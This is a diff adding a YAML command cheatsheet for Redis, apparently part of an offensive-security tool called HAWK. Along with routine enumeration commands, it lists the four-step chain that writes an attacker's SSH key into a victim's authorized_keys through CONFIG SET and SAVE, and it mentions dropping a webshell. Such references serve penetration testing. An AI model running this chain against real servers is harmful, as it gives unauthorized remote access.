@@ -1,0 +1,38 @@
+# HAWK DB cheatsheet — bundled default.
+# Override or extend at ~/.config/hawk/db_profiles/redis.yaml
+# Schema doc: hawkC/profiles/db_profiles/README.md
+---
+name: redis
+title: Redis
+aliases: []
+intro: Vanilla Redis < 6 has NO authentication.  CONFIG SET dir / dbfilename + SAVE
+  is the classic abuse chain (SSH key write, webshell drop).
+commands:
+- cmd: INFO
+  desc: Server info (version, mode, clients)
+- cmd: PING
+  desc: Connectivity check (PONG = OK)
+- cmd: DBSIZE
+  desc: Number of keys in current DB
+- cmd: KEYS *
+  desc: List ALL keys (slow on large DBs)
+- cmd: GET <key>
+  desc: Read string value of a key
+- cmd: HGETALL <hash>
+  desc: Read all fields of a hash
+- cmd: CONFIG GET *
+  desc: All server config (dir / dbfilename / requirepass)
+- cmd: CONFIG GET requirepass
+  desc: Auth state — empty = no password
+- cmd: CONFIG SET dir /var/lib/redis/.ssh
+  desc: 'Pivot 1/3: set save dir to victim ~/.ssh'
+- cmd: CONFIG SET dbfilename authorized_keys
+  desc: 'Pivot 2/3: rename dump file'
+- cmd: SET pwn "\n\nssh-rsa AAAA... attacker\n\n"
+  desc: 'Pivot 3/3: write SSH pubkey as key value'
+- cmd: SAVE
+  desc: Flush to disk (triggers the RCE chain)
+- cmd: CLUSTER NODES
+  desc: Cluster topology (if clustered)
+- cmd: quit
+  desc: Exit redis-cli
